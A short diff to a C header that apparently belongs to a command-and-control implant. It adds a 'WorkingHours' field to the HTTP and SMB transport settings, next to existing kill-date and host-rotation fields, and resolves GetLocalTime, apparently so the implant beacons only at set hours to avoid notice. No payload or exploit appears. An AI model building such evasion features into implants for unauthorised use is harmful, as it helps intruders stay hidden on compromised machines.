@@ -85,6 +85,7 @@ typedef struct
             PHOST_DATA Host;  /* current using host */
             PHOST_DATA Hosts; /* host linked list */
             UINT64     KillDate;
+            UINT32     WorkingHours;
             LPWSTR     Method; /* TODO: use WCHAR[4] instead of LPWSTR. */
             SHORT      HostRotation;
             DWORD      HostIndex;
@@ -106,6 +107,7 @@ typedef struct
             LPSTR   Name;
             HANDLE  Handle;
             UINT64  KillDate;
+            UINT32  WorkingHours;
 #endif
 
         } Transport;
@@ -205,6 +207,7 @@ typedef struct
         WIN_FUNC( GetModuleHandleA )
         WIN_FUNC( SetProcessValidCallTargets )
         WIN_FUNC( GetSystemTimeAsFileTime )
+        WIN_FUNC( GetLocalTime )
 
         /* Ntdll.dll */
         WIN_FUNC( LdrLoadDll )
